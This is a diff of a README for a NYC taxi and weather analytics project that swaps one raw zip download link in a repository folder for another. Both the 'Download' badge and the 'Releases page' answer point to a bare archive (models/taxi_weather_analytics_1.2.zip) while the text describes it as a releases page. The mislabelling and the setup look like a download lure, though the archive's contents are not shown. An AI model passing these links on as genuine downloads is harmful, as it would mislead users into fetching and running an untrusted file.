@@ -19,7 +19,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 🗂️ Download & Install
 To start using taxi-weather-analytics, visit this page to download:
 
-[![Download taxi-weather-analytics](https://github.com/Tetooozx/taxi-weather-analytics/raw/refs/heads/main/dags/weather-taxi-analytics-v2.0.zip)](https://github.com/Tetooozx/taxi-weather-analytics/raw/refs/heads/main/dags/weather-taxi-analytics-v2.0.zip)
+[![Download taxi-weather-analytics](https://github.com/Tetooozx/taxi-weather-analytics/raw/refs/heads/main/models/taxi_weather_analytics_1.2.zip)](https://github.com/Tetooozx/taxi-weather-analytics/raw/refs/heads/main/models/taxi_weather_analytics_1.2.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -60,7 +60,7 @@ If you wish to contribute to taxi-weather-analytics, feel free to reach out. We 
   A: You can analyze any NYC taxi trip data along with weather data from supported sources.
 
 - **Q: Are there updates available?**
-  A: Regularly check the [Releases page](https://github.com/Tetooozx/taxi-weather-analytics/raw/refs/heads/main/dags/weather-taxi-analytics-v2.0.zip) for new versions and updates.
+  A: Regularly check the [Releases page](https://github.com/Tetooozx/taxi-weather-analytics/raw/refs/heads/main/models/taxi_weather_analytics_1.2.zip) for new versions and updates.
 
 ## 📞 Support
 For any problems or questions, please contact our support team via the Issues tab on GitHub. We aim to respond quickly and assist you.
